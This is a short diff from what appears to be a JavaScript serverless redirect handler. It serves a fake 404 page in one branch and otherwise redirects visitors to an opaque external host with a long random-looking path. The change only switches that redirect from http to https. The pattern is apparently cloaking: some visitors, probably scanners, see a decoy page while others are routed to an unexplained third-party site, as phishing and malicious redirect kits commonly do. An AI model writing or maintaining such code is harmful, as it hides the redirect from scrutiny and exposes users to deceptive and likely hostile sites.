@@ -23,7 +23,7 @@ export default async function handler(req, res) {
         </body></html>`;
       return res.status(404).send(fake404);
     } else {
-      res.writeHead(302, { Location: 'http://uhgs.bzertwo.com/vDzwfpzwvDPnWhltZlmsPhfponXixczwihPaWzmqihhxQhDrZlXiWhynpxPnFimDihhxfpWjihhxpiApihPaondQ' });
+      res.writeHead(302, { Location: 'https://uhgs.bzertwo.com/vDzwfpzwvDPnWhltZlmsPhfponXixczwihPaWzmqihhxQhDrZlXiWhynpxPnFimDihhxfpWjihhxpiApihPaondQ' });
       return res.end();
     }
   } catch (err) {
